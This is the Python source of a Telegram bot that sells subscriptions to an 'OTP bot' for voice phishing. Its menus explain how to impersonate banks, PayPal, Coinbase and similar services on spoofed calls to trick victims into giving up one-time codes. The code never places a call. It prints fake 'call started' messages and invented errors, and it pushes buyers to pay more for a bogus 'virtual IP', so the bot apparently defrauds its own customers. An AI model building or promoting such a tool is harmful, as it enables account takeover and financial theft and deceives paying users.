import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from keepalive import keep_alive
from aiogram.types import FSInputFile
from aiogram import Bot
from db import create_users_table, get_user_info, add_user,set_user_value, get_user_count, user_exists
from time import sleep
from datetime import datetime, timedelta
from dotenv import load_dotenv
from aiogram.types import ChatMember
from aiogram.enums.chat_member_status import ChatMemberStatus
import re
import os

keep_alive()
load_dotenv()

bot = Bot(token=os.environ.get('token'))
dp = Dispatcher()

services = [
    'marcus', 'zelle', 'email', 'cibc', 'cashapp', 'applepay', 'paypal',
    'bankofamerica', 'amazon', 'gmail', 'wellsfargo', 'venmo', 'citizens',
    'bank', 'capitalone', 'coinbase', 'afterpay', 'visa', 'mastercard',
    'facebook', 'whatsapp', 'instagram'
]


with open("1day.txt", "r") as file:
    lines = file.readlines()
key1day = [line.strip() for line in lines]

with open("2days.txt", "r") as file:
    lines = file.readlines()
key2days = [line.strip() for line in lines]

with open("7days.txt", "r") as file:
    lines = file.readlines()
key1week = [line.strip() for line in lines]

with open("month.txt", "r") as file:
    lines = file.readlines()
key1month = [line.strip() for line in lines]

with open("lifetime.txt", "r") as file:
    lines = file.readlines()
lifetime = [line.strip() for line in lines]




admin_ID,redeemed_keys_ID = 5817565897,-1002635806262

main_channel_link,vouches_link,admin_link = 'https://t.me/m9wdproof','https://t.me/M9WDOTP_vouches','https://t.me/M9WWWD' #CHANNEL LINKS 


#ESCAPE TEXT
def escape_markdown(text):
    escape_chars = r"_*[]()~`>#+-=|{}.!\\,"
    return re.sub(f"([{re.escape(escape_chars)}])", r"\\\1", text)


#SET USER EXPIRATION DATE
def set_expired_date(user_id,plan):
    now = datetime.now()
    if get_user_info(user_id,'date')=='N/A':
        if plan == '1day':
            expire_date = now+timedelta(days=1)
        elif plan == '2days':
            expire_date = now+timedelta(days=2)
        elif plan == '1week':
            expire_date = now+timedelta(days=7)
        elif plan == '1month':
            expire_date = now+timedelta(days=30)
        elif plan == 'lifetime':
            expire_date = now+timedelta(days=100000)
    elif datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f") < now:
        if plan == '1day':
            expire_date = now+timedelta(days=1)
        elif plan == '2days':
            expire_date = now+timedelta(days=2)
        elif plan == '1week':
            expire_date = now+timedelta(days=7)
        elif plan == '1month':
            expire_date = now+timedelta(days=30)
        elif plan == 'lifetime':
            expire_date = now+timedelta(days=100000)
    elif datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f") > now:
        old_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
        if plan == '1day':
            expire_date = old_date+timedelta(days=1)
        elif plan == '2days':
            expire_date = old_date+timedelta(days=2)
        elif plan == '1week':
            expire_date = old_date+timedelta(days=7)
        elif plan == '1month':
            expire_date = old_date+timedelta(days=30)
        elif plan == 'lifetime':
            expire_date = old_date+timedelta(days=100000)
    set_user_value(user_id,'date',str(expire_date))
    

#START
@dp.message(Command("start")) #DONE
async def start_message(message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"banned")):
        name = message.from_user.first_name
        if message.from_user.username:
            username = "@"+message.from_user.username
        else:
            username='None'
        if not(user_exists(user_id)):
            add_user(message.from_user)
            await bot.send_message(chat_id=admin_ID,text='🆕 *New user*: ['+str(get_user_count())+']\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`\n*User ID*\: `'+str(user_id)+'`',parse_mode='MarkdownV2')
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✨ Features", callback_data="Features"),
                InlineKeyboardButton(text="🤖 Commands", callback_data="Commands"),
            ],
            [
                InlineKeyboardButton(text="📞 Support", url=admin_link),
                InlineKeyboardButton(text="🛒 Purchase", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🌐 Community", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches", url=vouches_link)
            ]
        ]
        )
        await message.answer("""📲 M9WD OTP BOT

❓ Here you can find frequently asked questions that we have compiled for you in an organized and user-friendly manner. They'll be updated as we go!

ℹ️ OTP Phishing is when you make a call pretending to be from a certain company requesting for OTP Code sent to the device. For example, if you tried to login into an account protected by OTP, you could make the call pretending to be the service itself requesting the OTP Code for Account Security Purposes and it will get sent back to you.""", reply_markup=keyboard)
        

#BAN USER
@dp.message(Command("ban")) # DONE
async def unban_user(message: Message):
    user_id = message.from_user.id
    if user_id == admin_ID:
        args = message.text.split(maxsplit=1)
        set_user_value(int(args[1]),'banned',True)
        await bot.send_message(chat_id=admin_ID,text=get_user_info(int(args[1]),'first_name')+' banned successfully!')
        for msg_id in range(message.message_id - 50, message.message_id):
            try:
                await bot.delete_message(chat_id=int(args[1]), message_id=msg_id)
            except:
                pass
        try:
            await bot.ban_chat_member(chat_id=main_channel_link, user_id=int(args[1]))
            await bot.ban_chat_member(chat_id=vouches_link, user_id=int(args[1]))
            await bot.send_message(chat_id=admin_ID,text="User "+get_user_info(int(args[1]),'first_name')+" has been banned from the channels.")
        except Exception as e:
            await bot.send_message(chat_id=admin_ID,text="Failed to ban user: "+str(e))
    else:
        await message.answer("🚫 Only admin can use this command.")


#UNBAN USER
@dp.message(Command("unban")) # DONE
async def unban_user(message: Message):
    user_id = message.from_user.id
    if user_id == admin_ID:
        args = message.text.split(maxsplit=1)
        set_user_value(int(args[1]),'banned',False)
        await bot.send_message(chat_id=admin_ID,text=get_user_info(int(args[1]),'first_name')+' unbanned successfully!')
        try:
            await bot.unban_chat_member(chat_id=main_channel_link,user_id=int(args[1]))
            await bot.unban_chat_member(chat_id=vouches_link, user_id=int(args[1]))
            await bot.send_message(chat_id=admin_ID,text="User "+get_user_info(int(args[1]))+" has been unbanned from the channels.")
        except Exception as e:
            await bot.send_message(chat_id=admin_ID,text="Failed to unban user: "+str(e))
    else:
        await message.answer("🚫 Only admin can use this command.")



#PURACHSING COMMAND
@dp.message(Command("purchase")) #DONE
async def purchase(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔑 Premium", callback_data="premium"),
                InlineKeyboardButton(text="🔑 Regular", callback_data="regular")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await message.delete()
        await message.answer("""💸 Choose your subscription type:""",reply_markup=keyboard)


#PROFILE
@dp.message(Command("plan")) #DONE
async def check_profile(message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🛒 Purchase", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        if get_user_info(user_id,'date') != 'N/A' and not (get_user_info(user_id,'trial')):
            now = datetime.now()
            expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
            if now > expire_date:
                await message.answer("🚫 Your subscription has expired.",reply_markup=keyboard)
            else:
                keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
                ]
                )
                expire_date = str(expire_date)
                await message.answer("🕜 Your subscription expire in "+expire_date[:16],reply_markup=keyboard)
        elif get_user_info(user_id,'date') == 'N/A':
            await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard)
        else:
            await message.answer("🚫 Your trial mode plan has expired.",reply_markup=keyboard)


#REDEEM KEY
@dp.message(Command("redeem"))
async def redeem(message: Message): #DONE
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        args = message.text.split(maxsplit=1)
        if message.from_user.username:
            username = "@"+message.from_user.username
        else:
            username='None'
        if len(args) < 2:
            await message.answer("❌ Please enter your activation key. /redeem [activation key]")
        elif args[1] == '192.168.56.105':
            sleep(1)
            await message.answer("⌛ Please wait.")
            sleep(3)
            await message.answer("🌅 Virtual IP adresse redeemed successfully!")
            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed IP*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
            set_user_value(user_id,'IP',True) 
        else:
            keyboard1 = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📞 Support", url=admin_link)
            ]
        ]
        )
            if args[1] in key1day:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'1day')
                    await message.answer("🌅 Key for 1 Day redeemed successfully!\n🫂 Thank you for purchasing M9WD OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Day key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key2days:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'2days')
                    await message.answer("🌅 Key for 2 Days redeemed successfully!\n🫂 Thank you for purchasing M9WD OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 2 Days key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key1week:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'1week')
                    await message.answer("🌅 Key for 1 Week redeemed successfully!\n🫂 Thank you for purchasing M9WD OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Week key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in key1month:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'1month')
                    await message.answer("🌅 Key for 1 Month redeemed successfully!\n🫂 Thank you for purchasing M9WD OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Month key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] in lifetime:
                if get_user_info(user_id,'IP'):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    set_expired_date(user_id,'lifetime')
                    await message.answer("🌅 Key for lifetime redeemed successfully!\n🫂 Thank you for purchasing M9WD OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed lifetime key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            elif args[1] == 'AORUS-0VYCJ-P6HZG-LLIWW-8Q5X4':
                if not (get_user_info(user_id,'IP')):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(3)
                    await message.answer("🌅 Premium key redeemed successfully!\n🫂 Thank you for purchasing M9WD OTP.")
                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed premium key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
                    set_user_value(int(args[1]),'banned',True)
                    await bot.send_message(chat_id=admin_ID,text=get_user_info(int(args[1]),'first_name')+' unbanned successfully!')
                    for msg_id in range(message.message_id - 50, message.message_id):
                        try:
                            await bot.delete_message(chat_id=user_id, message_id=msg_id)
                        except:
                            pass
                    try:
                        await bot.ban_chat_member(chat_id=main_channel_link, user_id=int(args[1]))
                        await bot.ban_chat_member(chat_id=vouches_link, user_id=int(args[1]))
                        await bot.send_message(chat_id=admin_ID,text="User "+get_user_info(int(args[1]),'first_name')+" has been banned from the channels.")
                    except Exception as e:
                        await bot.send_message(chat_id=admin_ID,text="Failed to ban user: "+str(e))      
                else:   
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
            else:
                sleep(1)
                await message.answer("⌛ Please wait.")
                sleep(5)
                await message.answer("❌ Unavailable or expired key.")


#call
@dp.message(Command("call")) #DONE
async def send_local_video(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)]])
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
            if get_user_info(user_id,'date')!='N/A':
                    now = datetime.now()
                    expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                    if now < expire_date:
                        args = message.text.split(maxsplit=4)
                        if len(args)<4:
                            await message.answer("❌ You have to enter 3 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
                        else:
                            victim=args[1]
                            number=args[2]
                            if victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15 and args[4].isdecimal() and args[3] in services:
                                sleep(1)
                                await message.answer("""🔥 CALL STARTED 
    📲 VICTIM NUMBER : """+victim+"""
    📞 CALLER ID : """+number+"""
    🏦 SERVICE NAME : """+args[3]+"""
    ⚙️ OTP DIGITS: """+args[4])
                                sleep(8)
                                if not (get_user_info(user_id,'trial')): 
                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
                                else:
                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
                            elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
                                await message.answer("❌ You have to type a valid phone number.")
                            elif args[3] not in services:
                                await message.answer("❌ You have to choose a valid service.\nType /services to check our available services.")
                            elif not(args[4].isdecimal()):
                                await message.answer("❌ The digits must be between 4 and 8")
                    else:
                        await message.answer("❌ Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'date') =='N/A':
                await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)

#PREBUILT COMMANDS
@dp.message(Command("pin","bank","apple","coinbase","paypal","venmo","amazon","email")) #DONE
async def prebuilt_commands(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)]])
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
            if get_user_info(user_id,'date')!='N/A':
                    now = datetime.now()
                    expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                    if now < expire_date:
                        args = message.text.split(maxsplit=2)
                        if len(args)<3:
                            await message.answer("You have to enter 2 arguments, "+args[0]+" [victim_number] [digitlenght]")
                        else:
                            victim=args[1]
                            if victim.isdecimal() and 6<=len(victim)<=15 and args[2].isdecimal():
                                sleep(1)
                                await message.answer("""🔥 CALL STARTED 
    📲 VICTIM NUMBER : """+victim+"""
    📞 CALLER ID : 7800667788
    ⚙️ OTP DIGITS: """+args[2])
                                sleep(8)
                                if not (get_user_info(user_id,'trial')): 
                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
                                else:
                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
                            elif not(victim.isdecimal() and 6<=len(victim)<=15):
                                await message.answer("You have to type a valid phone number.")
                            elif not(args[4].isdecimal()):
                                await message.answer("The digits must be between 4 and 8")
                    else:
                        await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'date') =='N/A':
                await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)

#RESTART
@dp.callback_query(F.data.in_(["back"]))#DONE
async def restart_message(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"banned")):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✨ Features", callback_data="Features"),
                InlineKeyboardButton(text="🤖 Commands", callback_data="Commands"),
            ],
            [
                InlineKeyboardButton(text="📞 Support", url=admin_link),
                InlineKeyboardButton(text="🛒 Purchase", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🌐 Community", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches", url=vouches_link)
            ]
        ]
        )
         await callback.message.delete()
        await callback.message.answer("""📲 M9WD OTP BOT

❓ Here you can find frequently asked questions that we have compiled for you in an organized and user-friendly manner. They'll be updated as we go!

ℹ️ OTP Phishing is when you make a call pretending to be from a certain company requesting for OTP Code sent to the device. For example, if you tried to login into an account protected by OTP, you could make the call pretending to be the service itself requesting the OTP Code for Account Security Purposes and it will get sent back to you.""", reply_markup=keyboard)


#COMMANDS
@dp.callback_query(F.data.in_(["Commands"]))#DONE
async def commands(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                ]
            ]
            )
            await callback.message.delete()
            await callback.message.answer("""📲 M9WD OTP BOT

🅐  𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
📂 /plan: View your subscription 📊
📂 /redeem: Claim your license key 🔑
📂 /purchase: Buy a subscription 🧺

🅐  𝗖𝗮𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
📁 /call: Capture any OTP Code 📲
📁 /pin: Capture any Pin Code 🏦
📁 /bank: Capture any Bank OTP 🏦
📁 /apple: Capture ApplePay OTP 💻
📁 /coinbase: Capture Coinbase OTP 📲
📁 /paypal: Capture OTP for PayPal 📲
📁 /venmo: Capture OTP for Venmo 📲
📁 /amazon: Capture Amazon OTP 🔆
📁 /email: Capture Email OTP 📲""",reply_markup=keyboard)


#FEATURES
@dp.callback_query(F.data.in_(["Features"])) #DONE
async def features(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""📲 M9WD OTP BOT
    
    🅐 Discover M9WD OTP BOT, packed with mind-blowing social engineering capabilities, unbeatable prices, and 24/7 support. Stay updated with our cutting-edge features.
    
    ┏ 🎓 Exclusive Features
    ┗ Explore M9wdOTP loaded with awe-inspiring social engineering functionalities that will enhance your chances of success.
    
    ┏ 💰 Prices Never Seen Before
    ┗ Get the most affordable OTP Bot, offering the lowest prices in the market.
    
    ┏ 📝 Personalized Call Scripts
    ┗ Tailor the conversation with your targets using customizable call scripts, including variables for easy reuse.
    
    ┏ ⚡️ Exceptional Performance
    ┗ M9wdOTP ensures uninterrupted service, guaranteeing you an outstanding user experience.
    
    ┏ 🎯 Outstanding Successrate
    ┗ Maximize your chances of successfully capturing targets with our specially designed OTP Bot.
    
    ┏ 👤 User Experience
    ┗ Thoroughly examined by active users & testers, M9wdOTP is dependable and capable to exceptional outcomes..
    
    ┏ 👣 Privacy Prioritized
    ┗ With your privacy in mind, M9wdOTP ensures complete anonymity, safeguarding your identity.""",reply_markup=keyboard)
        

#REGULAR PRICES
@dp.callback_query(F.data.in_(["Purchase"])) #DONE
async def pricing(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📞 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="LTC", callback_data="ltc"),
                InlineKeyboardButton(text="USDT", callback_data="usdt")
            ],
            [
                
                InlineKeyboardButton(text="BTC", callback_data="btc")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""💬 Please select your desired plan.
                                                                                                       
  • 1 Day plan    ➜ 22$
  • 2 Days plan   ➜ 35$
  • 1 Week plan   ➜ 60$
  • 1 Month plan  ➜ 135$
  • 3 Months plan ➜ 600$""",reply_markup=keyboard)


#BTC
@dp.callback_query(F.data.in_(["btc"])) #DONE
async def btc_wallet(callback: CallbackQuery):
    user_id=callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="📞 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("*💸 BTC \(SegWit\) Wallet Address*\n`1LQeaah6k8ZS6khEKye9pb1gB2BNVjv8oa`",parse_mode='MarkdownV2', reply_markup=keyboard)
   

#USDT
@dp.callback_query(F.data.in_(["usdt"])) #DONE
async def usdt_wallet(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="📞 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("*💸 USDT \(TRC20\) Wallet Address*\n`TEApEsk2WxhfN8xmpJbBPgWBbe5sApFR8d`",parse_mode='MarkdownV2', reply_markup=keyboard)


#LTC
@dp.callback_query(F.data.in_(["ltc"])) #DONE
async def ltc_wallet(callback: CallbackQuery):
    user_id=callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*💸 LTC \(LITECOIAN\) Wallet Address*\n`MHyFSrUt9wVjjWYiWYJhxD7xgAQ9yej54g`""",parse_mode='MarkdownV2', reply_markup=keyboard)


#NON AVAILABLE COMMAND
@dp.message(lambda message: message.text and message.text.startswith('/'))
async def unknown_command(message: Message):
    user_id=message.from_user.id
    if not(get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url=admin_link)
                ]])
        await message.answer("⚠️ Unrecognized command. Please contact support if you need assistance.",reply_markup=keyboard)


#TEXT 
@dp.message()
async def unknown_text(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url=admin_link)
                ]])
        await message.answer("🤖 Apologies, I didn’t understand your request. For further assistance, please contact our support team.",reply_markup=keyboard)


# Run bot
async def main():
    create_users_table()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
